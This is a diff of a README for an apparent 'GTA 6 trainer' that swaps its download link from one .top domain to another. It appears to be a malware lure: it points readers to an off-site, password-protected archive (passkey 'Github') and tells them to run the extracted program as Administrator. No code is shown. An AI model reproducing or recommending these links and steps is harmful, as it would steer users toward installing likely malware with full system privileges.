@@ -6,7 +6,7 @@ GTA 6 trainer with god mode, unlimited ammo, unlimited money, wanted level contr
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -73,7 +73,7 @@ Based on popular mods like **Simple Trainer**, **Menyoo**, and **Native Trainer*
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch GTA 6.
 4. Run the trainer **as Administrator**.
